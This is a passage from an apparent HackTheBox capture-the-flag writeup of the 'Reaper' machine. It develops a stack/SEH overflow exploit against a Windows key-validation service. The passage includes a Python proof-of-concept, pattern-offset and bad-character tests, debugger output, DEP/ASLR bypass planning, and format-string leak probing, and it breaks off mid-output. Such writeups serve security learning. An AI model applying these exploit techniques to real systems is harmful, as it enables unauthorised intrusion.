nested <code>while</code> loops.  This is where the string is sent to the user, and input is received by the user.  If the user input isn't \"1\", we break out of the third <code>while</code> loop, and nothing follows that <code>while</code> loop so we effectively break out of the second <code>while</code> loop as well.  </p> <p>We can see that on line 35, the server <code>send</code>s \"Enter a key: \",  then on line 38 we see a <code>recv</code> into <code>local_40</code> (that is the second <code>VirtualAlloc</code>), without a size.  Of note, the first argument is <code>local_50</code> (actually to all the <code>send</code> and <code>recv</code> calls, which means that is the client <code>sockfd</code>.  So lines 35 and 38 prompt the user for a key input.  Line 40 is a do-nothing.  </p> <p>The function call on line 41 to <code>validate_key_format</code> is particularly interesting, it seems to process the supplied key by checking the key prefix and deeply nested function call to:</p> <pre><code>        bVar2 = __crt_stdio_input::format_string_parser&lt;char&gt;::advance\n                          ((format_string_parser&lt;char&gt; *)(param_1 + 0x20));\n</code></pre> <p>But it is what occurs after the first <code>while</code> loop that is most interesting.</p> <p></p> <p>The function call to <code>find_key</code> does things like open a file <code>keys.txt</code> for reading, and nested function call within it seems to do what appears to be base64 decoding (could be wrong), and some string comparison.</p> <p>But it is the call to <code>case_exec</code> where the magic is at.  It is called with a pointer to the user-supplied buffer, null, and 0x1000 which I assume is a <code>maxlength</code>.</p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#case_exec","title":"case_exec","text":"<p>The <code>case_exec</code> function starts off with a rather long <code>switch</code>/<code>case</code> statement, longer than I could fit in a screenshot so I include the first part of it</p> <p></p> <p>In order to trace with some dynamic analysis I rebase the application to 0x0, so I can use relative offsets in <code>windbg</code>.   For that, I open memory map in Ghidra, click the house icon, and rebase to 0x0.</p> <p></p> <p>I use <code>windbg</code> to place a breakpoint at the call and step into it once the breakpoint is hit.  Here is what I use to handle lifecycle and breakpoint.</p> <pre><code>((cmd.exe /c \"taskkill /F /IM dev_keysvc.exe\" &amp;&amp; timeout 1 &amp;&amp; START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) || START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) &amp;&amp; timeout 1 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn dev_keysvc.exe -c 'bp dev_keysvc+0x1116; g'\n</code></pre> <p>And I start with an initial buffer to try to reach the function.  Because the base64 will be longer than the input to it, and because upper bound is 0x1000, I use something a little smaller, like, 3000 bytes (<code>0xbb8</code>) instead of the full 4096.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ nc 192.168.56.100 4141 &lt; &lt;(echo -ne \"1\\n101-FE9A1-550-A271-0109-\"$(perl -e 'printf \"A\"x0xbb8'|base64 -w0)\"\\n\"; sleep 2; echo -ne \"2\\n\"; sleep 2; echo -ne \"3\\n\")\n</code></pre> <p>The function starts off with some function prologue followed by moving the base address into <code>r10</code>.</p> <p>Shortly after, there is a comparison of <code>maxlen</code> (arg3) to <code>0xf</code>.  <code>0x1000</code> is obviously greater than this, so we would take this jump, which basically we skip the <code>switch</code>/<code>case</code> statement.</p> <p></p> <p>Stepping through execution to the jump above instruction, that is exactly what happens.</p> <p></p> <p>That brings us here:</p> <p></p> <p>We can skip over the IF statement on line 73 because <code>maxlen</code> is <code>0x1000</code>, so we know <code>maxlen</code> can't be less than <code>0x21</code>.</p> <p>We can also skip over the IF statement on line 79 because at the time we reach that comparison, the data region evaluates to 5.  Of interesting note is that there appears to be a function pointer exec on line 100, and things like this start to look relevant, interesting, and maybe even exciting.</p> <p>A comparison statement on line 106 is what follows.</p> <p></p> <p>If execution can enter the innermost IF statement visible in the screenshot above, <code>maxlen</code> is tested against <code>0x120</code> through <code>0x1ff</code> through a series of <code>case</code> statements.  There are other cases too like <code>0x100</code> and a <code>default</code> case, only the latter of which doesn't result in a <code>vmovntdq_avx</code>.  That instruction moves memory around in chunks of 256 bytes based on analysis.</p> <p>But at the end of this operation there is another function pointer exec.</p> <p></p> <p>Examining the code that is in fact exactly what happens</p> <p></p> <p>If I set a breakpoint on this <code>jmp r11</code> instruction and continue (g), sure enough, that is where execution lands.</p> <p></p> <p>But unfortunately, it appears we actually just jump to code that zeroes out the memory</p> <pre><code>0:003&gt; u r11\ndev_keysvc+0x32d1:\n00007ff6`2c4232d1 c4a17e7f840920ffffff vmovdqu ymmword ptr [rcx+r9-0E0h],ymm0\n00007ff6`2c4232db c4a17e7f840940ffffff vmovdqu ymmword ptr [rcx+r9-0C0h],ymm0\n00007ff6`2c4232e5 c4a17e7f840960ffffff vmovdqu ymmword ptr [rcx+r9-0A0h],ymm0\n00007ff6`2c4232ef c4a17e7f440980  vmovdqu ymmword ptr [rcx+r9-80h],ymm0\n00007ff6`2c4232f6 c4a17e7f4409a0  vmovdqu ymmword ptr [rcx+r9-60h],ymm0\n00007ff6`2c4232fd c4a17e7f4409c0  vmovdqu ymmword ptr [rcx+r9-40h],ymm0\n00007ff6`2c423304 c4a17e7f4401e0  vmovdqu ymmword ptr [rcx+r8-20h],ymm0\n00007ff6`2c42330b c5fe7f00        vmovdqu ymmword ptr [rax],ymm0\n0:003&gt; r ymm0\nymm0=           0            0            0            0            0            0            0            0\n</code></pre> <p>Based on what I understand so far, it seems we need to fill a buffer through Option 1, and we can cause arbitrary code execution through Option 2 so long as the key is found.</p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>If I run the application on my sandbox VM, it opens a port 4141.  If I connect to it using <code>netcat</code>, and try supplying one of the keys provided in <code>dev_keys.txt</code>, it says it couldn't find the key.</p> <p></p> <p>The console output of the application server-side:</p> <p></p> <p>The function <code>find_key</code> does make mention of <code>keys.txt</code>, but just to be sure where it expects it...</p> <p>If I use Process Monitor from Sysinternals (https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), with the following filtering: * process name contains 'dev_keysvc'</p> <p>When I resend the same flow of requests (option 1, option 2), there is an attempt to <code>CreateFile</code>(handle) on a file <code>keys.txt</code> in the same working directory as the binary.</p> <p></p> <p>So I'll create the file with the same contents as provided in the original <code>dev_keys.txt</code>:</p> <pre><code>100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==\n101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl\n102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl\n</code></pre> <p>After going through the same flow, the error output no longer occurs, but the application still sends back to the client \"Could not find key!\".</p> <pre><code>Checking key: 101-FE9A1-550-A271-0109, Comment: Premium License\nCould not find key!\nChoose an option:\n1. Set key\n2. Activate key\n3. Exit\n</code></pre> <p>For this particular example, we need the 64bit <code>windbg</code>, and tailored to this application,  it would be:</p> <pre><code>((cmd.exe /c \"taskkill /F /IM dev_keysvc.exe\" &amp;&amp; timeout 3 &amp;&amp; START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) || START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) &amp;&amp; timeout 3 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn dev_keysvc.exe -c 'g'\n</code></pre> <p>The <code>-c</code> cmd specifies instructions to start with.  In this case I just want to attach to it and continue, and that way I can fuzz at it, to see if I can invoke a crash.</p> <p>Other note, but it has to be started from a <code>cmd.exe</code>, powershell won't work here.</p> <p>Basic send Options 1, 2, 3 </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ nc 192.168.56.100 4141 &lt; &lt;(echo -ne \"1\\n101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl\\n\"; sleep 2; echo -ne \"2\\n\"; sleep 2; echo -ne \"3\\n\")\nChoose an option:\n1. Set key\n2. Activate key\n3. Exit\nEnter a key: Valid key format\nChoose an option:\n4. Set key\n5. Activate key\n6. Exit\nChecking key: 101-FE9A1-550-A271-0109, Comment: Premium License\nCould not find key!\nChoose an option:\n7. Set key\n8. Activate key\n9. Exit\n</code></pre><p></p> <p>When I attach to <code>dev_keysvc.exe</code> using <code>windbg</code>, the process is loaded into a memory range that differs from the AddressOfEntryPoint field in the PE header.</p> <pre><code>ModLoad: 00007ff7`66a80000 00007ff7`66ab3000   C:\\reaper\\dev_keysvc.exe\n</code></pre> <p>Obviously my <code>Ghidra</code> analysis will need to be rebased to this range.  That is done by opening Alt+W (window), selecting Memory Map, and selecting the Home icon.</p> <p></p> <p>Afterward all of the addressing will match up with <code>windbg</code>.  I need to break at the function call to <code>find_key</code></p> <p></p> <p>After rebase, it is at <code>7ff766a811ca</code></p> <p></p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#fuzzing-for-a-controllable-crash","title":"Fuzzing for a controllable crash","text":"<p>I am able to select option 1, send the key, select option 2, and select option three with the following basic python </p> <pre><code>def main():\n    if len(sys.argv) &lt; 2:\n        print(f\"USAGE: {sys.argv[0]} ip:port &lt;optional&gt;\")\n        sys.exit()\n    else:\n        ip, port = sys.argv[1].split(\":\")\n        port = int(port)\n        sock = cx(ip,port,0)\n\n\n    numeral = int(sys.argv[2])\n    pay = (base64.b64encode(bytearray(\"A\"*numeral,'latin-1'))).decode('latin-1')\n    bufs = [\"1\\n\", f\"110-FE9A1-550-A271-0109-{pay}\\n\", \"2\\n\", \"3\\n\"]\n\n    for x in range(0,len(bufs)):\n        ## recv from server\n        print(sock.recv(4096))\n        ## print first 32 bytes of what will be sent\n        print(f\"{bufs[x][:32].replace((b'\\x0a').decode('latin-1'),r'\\\\n')}[...]\")\n        ## send to server\n        sock.send(bufs[x].encode('latin-1'))\n</code></pre> <p>If I set a breakpoint at the call to <code>find_key</code>, after I send a buffer of 3000 As:</p> <p>The breakpoint is hit</p> <pre><code>Breakpoint 0 hit\ndev_keysvc+0x11ca:\n00007ff7`66a811ca e841070000      call    dev_keysvc+0x1910 (00007ff7`66a81910)\n</code></pre> <p></p> <p>Looking at the exception chain, it is already overflowed by the buffer.</p> <p></p> <p>For reference, this crash occured with an input buffer (before base64) of just 3000 bytes.  Obviously these 3000 bytes get base64'd and appended to the beginning of the key.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ ./poc.py 192.168.56.100:4141 3000\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ cat poc.py | awk -v RS=\"\" '/bufs/' \n    numeral = int(sys.argv[2])\n    pay = (base64.b64encode(bytearray(\"A\"*numeral,'latin-1'))).decode('latin-1')\n    bufs = [\"1\\n\", f\"110-FE9A1-550-A271-0109-{pay}\\n\", \"2\\n\", \"3\\n\"]\n    for x in range(0,len(bufs)):\n        print(sock.recv(4096))\n        print(f\"{bufs[x][:32].replace((b'\\x0a').decode('latin-1'),r'\\\\n')}[...]\")\n        sock.send(bufs[x].encode('latin-1'))\n</code></pre> <p>Call stack with emphasis on exception-related information</p> <pre><code>0:003&gt; kb e\n # RetAddr               : Args to Child                                                           : Call Site\n00 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : dev_keysvc+0x16f1\n01 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141\n02 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141\n03 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141\n04 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Reaper/#triangulating-a-pattern","title":"Triangulating a pattern","text":"<p>If I re-run this same excercise, but instead of 3000 As I pass a pattern string of length 3000:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ ./poc.py 192.168.56.100:4141 $(msf-pattern_create 64 -l 3000)\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ cat poc.py | awk -v RS=\"\" '/bufs/' \n\n    pattern = sys.argv[2]\n    pay = (base64.b64encode(bytearray(pattern,'latin-1'))).decode('latin-1')\n    bufs = [\"1\\n\", f\"110-FE9A1-550-A271-0109-{pay}\\n\", \"2\\n\", \"3\\n\"]\n    for x in range(0,len(bufs)):\n        print(sock.recv(4096))\n        print(f\"{bufs[x][:32].replace((b'\\x0a').decode('latin-1'),r'\\\\n')}[...]\")\n        sock.send(bufs[x].encode('latin-1'))\n</code></pre> <p>The pattern appears:</p> <pre><code>00007ff7`66a81937 e874fcffff      call    dev_keysvc+0x15b0 (00007ff7`66a815b0)\n0:003&gt; p\n(136c.e0c): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\ndev_keysvc+0x16f1:\n00007ff7`66a816f1 c3              ret\n0:003&gt; !exchain\n100 stack frames, scanning for handlers...\nFrame 0x01: error getting module for 3164413064413963\nFrame 0x02: error getting module for 6441336441326441\nFrame 0x03: error getting module for 4136644135644134\nFrame 0x04: error getting module for 3964413864413764\n\n[...]\n\n0:003&gt; kb e\n # RetAddr               : Args to Child                                                           : Call Site\n00 31644130`64413963     : 64413364`41326441 41366441`35644134 39644138`64413764 65413165`41306541 : dev_keysvc+0x16f1\n01 64413364`41326441     : 41366441`35644134 39644138`64413764 65413165`41306541 41346541`33654132 : 0x31644130`64413963\n02 41366441`35644134     : 39644138`64413764 65413165`41306541 41346541`33654132 37654136`65413565 : 0x64413364`41326441\n03 39644138`64413764     : 65413165`41306541 41346541`33654132 37654136`65413565 66413965`41386541 : 0x41366441`35644134\n</code></pre> <p>Exact match at 88 bytes in.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ msf-pattern_offset 64 -l 3000 -q 3164413064413963\n[*] Exact match at offset 88\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Reaper/#controlling-seh","title":"Controlling SEH","text":"<p>After refactoring for controlling SEH, </p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ ./poc.py 192.168.56.100:4141\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ cat poc.py | awk -v RS=\"\" '/bufs/' \n\n    crash=3000\n    crashlen=88\n    onramp=(\"\\x41\")*crashlen\n    SEH=(\"\\x42\"*8)\n    offramp= (\"\\x43\" * (crash - sum([len(x) for x in [\n        onramp,\n        SEH\n    ]])))\n    compiled_payload = f\"{onramp}{SEH}{offramp}\"\n    pay = (base64.b64encode(bytearray(compiled_payload,'latin-1'))).decode('latin-1')\n    bufs = [\"1\\n\", f\"110-FE9A1-550-A271-0109-{pay}\\n\", \"2\\n\", \"3\\n\"]\n    for x in range(0,len(bufs)):\n        print(sock.recv(4096))\n        print(f\"{bufs[x][:32].replace((b'\\x0a').decode('latin-1'),r'\\\\n')}[...]\")\n        sock.send(bufs[x].encode('latin-1'))\n</code></pre> <p>SEH is controlled</p> <pre><code>00007ff7`66a81937 e874fcffff      call    dev_keysvc+0x15b0 (00007ff7`66a815b0)\n0:001&gt; p\n(2110.1378): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\ndev_keysvc+0x16f1:\n00007ff7`66a816f1 c3              ret\n0:001&gt; !exchain\n100 stack frames, scanning for handlers...\nFrame 0x01: error getting module for 4242424242424242\nFrame 0x02: error getting module for 4343434343434343\nFrame 0x03: error getting module for 4343434343434343\nFrame 0x04: error getting module for 4343434343434343\n\n[...]\n\n0:001&gt; kb e\n # RetAddr               : Args to Child                                                           : Call Site\n00 42424242`42424242     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : dev_keysvc+0x16f1\n01 43434343`43434343     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : 0x42424242`42424242\n02 43434343`43434343     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : 0x43434343`43434343\n03 43434343`43434343     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : 0x43434343`43434343\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Reaper/#identifying-bad-characters","title":"Identifying bad characters","text":"<p>I have a function I created for this, <code>gen_badchars</code>.  It will create a string containing all bytes sequentially between a start and end range, then filter out any that are passed as first argument.</p> <pre><code>badchars = \"\"\ndef gen_badchars(bc, start=\"\\x01\", end=\"\\xff\"):\n    s_int = ord(start)\n    e_int = ord(end)+1\n    BC = bytearray(range(s_int,e_int)).decode('latin-1')\n    for item in bc:\n        BC = BC.replace(item,'')\n    return BC\n</code></pre> <p>I'll start with the full range of bytes between 0x00 and 0xFF.   As bad characters are identified, I can add them to the variable <code>badchars</code>, which gets passed as the first argument.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ cat poc.py | awk -v RS=\"\" '/bufs/' \n\n    crash=3000\n    crashlen=88\n    onramp=(\"\\x41\")*crashlen\n    SEH=(\"\\x42\"*8)\n    bad = gen_badchars(badchars,start=\"\\x00\",end=\"\\xff\")   #&lt;-----\n    offramp= (\"\\x43\" * (crash - sum([len(x) for x in [\n        onramp,\n        SEH,\n        bad     #&lt;-----\n    ]])))\n    compiled_payload = f\"{onramp}{SEH}{bad}{offramp}\"   #&lt;------\n    pay = (base64.b64encode(bytearray(compiled_payload,'latin-1'))).decode('latin-1')\n    bufs = [\"1\\n\", f\"110-FE9A1-550-A271-0109-{pay}\\n\", \"2\\n\", \"3\\n\"]\n    for x in range(0,len(bufs)):\n        print(sock.recv(4096))\n        print(f\"{bufs[x][:32].replace((b'\\x0a').decode('latin-1'),r'\\\\n')}[...]\")\n        sock.send(bufs[x].encode('latin-1'))\n</code></pre> <p>When I resend, I find there are no bad characters</p> <pre><code>0:003&gt; db rsp L0xFF+9\n000000d2`a29fe908  42 42 42 42 42 42 42 42-00 01 02 03 04 05 06 07  BBBBBBBB........\n000000d2`a29fe918  08 09 0a 0b 0c 0d 0e 0f-10 11 12 13 14 15 16 17  ................\n000000d2`a29fe928  18 19 1a 1b 1c 1d 1e 1f-20 21 22 23 24 25 26 27  ........ !\"#$%&amp;'\n000000d2`a29fe938  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567\n000000d2`a29fe948  38 39 3a 3b 3c 3d 3e 3f-40 41 42 43 44 45 46 47  89:;&lt;=&gt;?@ABCDEFG\n000000d2`a29fe958  48 49 4a 4b 4c 4d 4e 4f-50 51 52 53 54 55 56 57  HIJKLMNOPQRSTUVW\n000000d2`a29fe968  58 59 5a 5b 5c 5d 5e 5f-60 61 62 63 64 65 66 67  XYZ[\\]^_`abcdefg\n000000d2`a29fe978  68 69 6a 6b 6c 6d 6e 6f-70 71 72 73 74 75 76 77  hijklmnopqrstuvw\n000000d2`a29fe988  78 79 7a 7b 7c 7d 7e 7f-80 81 82 83 84 85 86 87  xyz{|}~.........\n000000d2`a29fe998  88 89 8a 8b 8c 8d 8e 8f-90 91 92 93 94 95 96 97  ................\n000000d2`a29fe9a8  98 99 9a 9b 9c 9d 9e 9f-a0 a1 a2 a3 a4 a5 a6 a7  ................\n000000d2`a29fe9b8  a8 a9 aa ab ac ad ae af-b0 b1 b2 b3 b4 b5 b6 b7  ................\n000000d2`a29fe9c8  b8 b9 ba bb bc bd be bf-c0 c1 c2 c3 c4 c5 c6 c7  ................\n000000d2`a29fe9d8  c8 c9 ca cb cc cd ce cf-d0 d1 d2 d3 d4 d5 d6 d7  ................\n000000d2`a29fe9e8  d8 d9 da db dc dd de df-e0 e1 e2 e3 e4 e5 e6 e7  ................\n000000d2`a29fe9f8  e8 e9 ea eb ec ed ee ef-f0 f1 f2 f3 f4 f5 f6 f7  ................\n000000d2`a29fea08  f8 f9 fa fb fc fd fe ff\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Reaper/#easy-so-far-whats-the-catch","title":"Easy so far, what's the catch?","text":"<p>This is slightly unsettling to me, because this machine is supposed to be an <code>INSANE</code> level machine, but crash + control SEH + badchars, pretty standard stuff so far, maybe even too easy.  So what's the catch?</p> <p>And then it occurred to me, to check on loaded process and module protections</p> <pre><code>0:003&gt; !load narly\n\n      __s|I}*!{a.                        ._s,aan2*a\n     _wY1+~-    )S,                     .ae\"~=:...:X\n   .vXl+:.       -4c                   &lt;2+=|==::..:d\n   vvi=;..        -?o,                =2=+==:::...=d\n  )nv=:.            )5,              .2=--.......-=d\n  ue+::              -*s             &lt;c .        .=d\n  m&gt;==::..     ._,     &lt;s,           )c           :d\n  #==viii|===; {Xs=,    -{s          )c         ..:d\n  Z;{nnonnvvii;v(-{%=.    ~s,        )e:====||iiv%=d\n  X={oooonvvIl;3;  -{%,    -*&gt;       )2&lt;onnnnvnnnn&gt;d\n  X=)vvvvIliii:3;    -!s.   :)s.     )e&lt;oonvlllllIid\n  X=&lt;lllliii|=:n;      -1c.  +|1,    )z&lt;nvii||+|+|vX\n  S=&lt;lli|||=:: n;        \"nc  -s%;   )c=ovl|++==+=vo\n  X=&lt;i||+=; . .n`          \"1&gt;.-{%i. )c&lt;Xnnli||++=vn\n  X=iii&gt;==-.  :o`            \"1,:+iI,)c:Sonnvli||=v(\n  X&gt;{ii+;:-  .u(               \"o,-{Iw(:nvvvllii=v2\n  S=i||;:. .=u(                 -!o,+I(:iiillii|ie`\n  2&gt;v|==__su?`                    -?o,-:==||iisv\"\n  {nvnI!\"\"~                         -!sasvv}\"\"`\n\n             by Nephi Johnson (d0c_s4vage)\n                      N for gnarly!\n\nAvailable commands:\n\n    !nmod     - display /SafeSEH, /GS, DEP, and ASLR info for\n                all loaded modules\n\n0:003&gt; !nmod\n66a80000 66ab3000 dev_keysvc           /SafeSEH OFF     *ASLR *DEP C:\\reaper\\dev_keysvc.exe\n4a170000 4a182000 kernel_appcore       /SafeSEH OFF     *ASLR *DEP C:\\Windows\\SYSTEM32\\kernel.appcore.dll\n4b9b0000 4ba1a000 mswsock              /SafeSEH OFF     *ASLR *DEP C:\\Windows\\system32\\mswsock.dll\n4c5e0000 4c8d6000 KERNELBASE           /SafeSEH OFF     *ASLR *DEP C:\\Windows\\System32\\KERNELBASE.dll\n4cc90000 4cd2e000 msvcrt               /SafeSEH OFF     *ASLR *DEP C:\\Windows\\System32\\msvcrt.dll\n4d580000 4d6a0000 RPCRT4               /SafeSEH OFF     *ASLR *DEP C:\\Windows\\System32\\RPCRT4.dll\n4e0c0000 4e12b000 WS2_32               /SafeSEH OFF     *ASLR *DEP C:\\Windows\\System32\\WS2_32.dll\n4e130000 4e1f2000 KERNEL32             /SafeSEH OFF     *ASLR *DEP C:\\Windows\\System32\\KERNEL32.DLL\n4ec70000 4ee68000 ntdll                /SafeSEH OFF     *ASLR *DEP C:\\Windows\\SYSTEM32\\ntdll.dll\n\n*DEP/*ASLR means that these modules are compatible with ASLR/DEP\n</code></pre> <p>And there it is.  DEP and ASLR are enabled.  In fact, there is nothing loaded where it isn't, so only way to win is by ROPchain to bypass DEP, and because of the latter I will need a memory leak to bypass ASLR.</p> <p>Seeing as how we know where and how to get to the crash, we can use the following argument to <code>windbg</code> to fastforward to raised exception.  We set a breakpoint at the function that, if we pass over it, catches exception.</p> <pre><code> -c 'bp 0x7ff766a81937; g; p; !exchain L0x4' \n</code></pre> <p>One other consideration is what method to employ, and for that I found that really the only method of interest imported by <code>dev_keysvc.exe</code> is  <code>VirtualAlloc</code> that might be used for this.  We might be able to use <code>VirtualAlloc</code> in much the same way as <code>VirtualProtect</code>,  and here is how.</p> <p>https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</p> <p>VirtualAlloc:</p> <pre><code>LPVOID VirtualAlloc(\n  [in, optional] LPVOID lpAddress,\n  [in]           SIZE_T dwSize,\n  [in]           DWORD  flAllocationType,\n  [in]           DWORD  flProtect\n);\n</code></pre> <p>\"Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. Memory allocated by this function is automatically initialized to zero. \"</p> <p>However memory already reserved and committed can have its memory protections changed/updated, if we supply <code>flProtect</code> with a value of MEM_COMMIT (<code>0x00001000</code>), we can supply an <code>flAllocationType</code> of  PAGE_EXECUTE_READWRITE (<code>0x40</code>) https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants.  </p> <p>In this way we can effectively perform a <code>VirtualProtect</code> without <code>VirtualProtect</code>, on an existing memory region.</p> <p>And then there's the matter of ASLR.  Only rational way to bypass that is to find some type of leak of an address of one of the modules, or the binary itself, at runtime.  That way ROP gadgets can use realtive addressing added to a base address.</p> <p>Registers at time of crash:</p> <pre><code>0:003&gt; r\nrax=00000000ffffffff rbx=000001e554b7bc60 rcx=4a4db4eaa5a70000\nrdx=0000000000000000 rsi=0000000000000000 rdi=4141414141414141\nrip=00007ff766a816f1 rsp=000000d2a29fe908 rbp=0000000000000000\n r8=0000000000000054  r9=0000000000000054 r10=0000000000000007\nr11=000000d2a29fe820 r12=0000000000000000 r13=0000000000000000\nr14=0000000000000000 r15=0000000000000000\niopl=0         nv up ei pl nz na po nc\ncs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206\n</code></pre> <p>RDI currently holds AAAAA... </p> <p>With any luck, I would be able to locate the offset of RDI at time of crash, inject a format string at that location, and dereference pointers to obtain leaked addresses.  But then there's also the matter of, how to get the application to report them back to me.   A lot to figure out.  Let's start with RDI pattern and offset.</p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#rdi-pattern-and-offset","title":"RDI pattern and offset","text":"<p>If I send another 3000 byte pattern :</p> <pre><code>    pattern = sys.argv[2]\n    pay = (base64.b64encode(bytearray(pattern,'latin-1'))).decode('latin-1')\n    bufs = [ \"1\\n\", f\"110-FE9A1-550-A271-0109-{pay}\\n\", \"2\\n\", \"3\\n\"]\n    for x in range(0,len(bufs)):\n        print(sock.recv(4096))\n        print(f\"{bufs[x][:32].replace((b'\\x0a').decode('latin-1'),r'\\\\n')}[...]\")\n        sock.send(bufs[x].encode('latin-1'))\n</code></pre> <p>This time RDI holds a pattern:  <code>4138634137634136</code></p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ msf-pattern_offset 64 -l 3000 -q 4138634137634136\n[*] Exact match at offset 80\n</code></pre> <p>Not quite sure that's going to work.  I tried playing with format strings in this range but anything supplied here just gets converted to hex on the other end.  So <code>%d</code> for example is converted to hex <code>2564</code>.  Not going to work.</p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#time-for-another-plan","title":"Time for another plan","text":"<p>While playing around with the application, I noticed that if you set a key and then activate it, it gets repeated back to you with the base64 decoded, if it is valid format:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ nc 192.168.56.100 4141\nChoose an option:\n1. Set key\n2. Activate key\n3. Exit\n1\nEnter a key: 100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==\nValid key format\nChoose an option:\n4. Set key\n5. Activate key\n6. Exit\n2\nChecking key: 100-FE9A1-500-A270-0102, Comment: Standard License\nCould not find key!\nChoose an option:\n7. Set key\n8. Activate key\n9. Exit\n</code></pre> <p>This part of output: </p><pre><code>Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License\n</code></pre><p></p> <p>If we try to send a format string instead:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ nc 192.168.56.100 4141\nChoose an option:\n1. Set key\n2. Activate key\n3. Exit\n1\nEnter a key: %s%p\nInvalid key format\nChoose an option:\n4. Set key\n5. Activate key\n6. Exit\n2\n\nCould not find key!\nChoose an option:\n1. Set key\n2. Activate key\n3. Exit\n</code></pre> <p>It doesn't work, we get an empty string.</p> <p>However when I set a key, activate it, then set another key as a format string, and activate that, I get a leak of some kind:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ nc 192.168.56.100 4141\nChoose an option:\n1. Set key\n2. Activate key\n3. Exit\n1\nEnter a key: 110-FE9A1-550-A271-0109-U3RhbmRhcmQgTGljZW5zZQ==\nValid key format\nChoose an option:\n4. Set key\n5. Activate key\n6. Exit\n2\nChecking key: 110-FE9A1-550-A271-0109, Comment: Standard License\nCould not find key!\nChoose an option:\n7. Set key\n8. Activate key\n9. Exit\n1\nEnter a key: %s%p\nInvalid key format\nChoose an option:\n10. Set key\n11. Activate key\n12. Exit\n2\nChecking key: Checking key: 000001BA0, Comment: \nCould not find key!\nChoose an option:\n13. Set key\n14. Activate key\n15. Exit\n</code></pre> <p>This:</p> <pre><code>Checking key: Checking key: 000001BA0, Comment: \n</code></pre> <p>It repeated the \"Checking key: \" portion, but probably because my format string was <code>%s%p</code>.  If I rerun the test with just <code>%p</code>:</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ nc 192.168.56.100 4141\nChoose an option:\n1. Set key\n2. Activate key\n3. Exit\n1\nEnter a key: 110-FE9A1-550-A271-0109-U3RhbmRhcmQgTGljZW5zZQ==\nValid key format\nChoose an 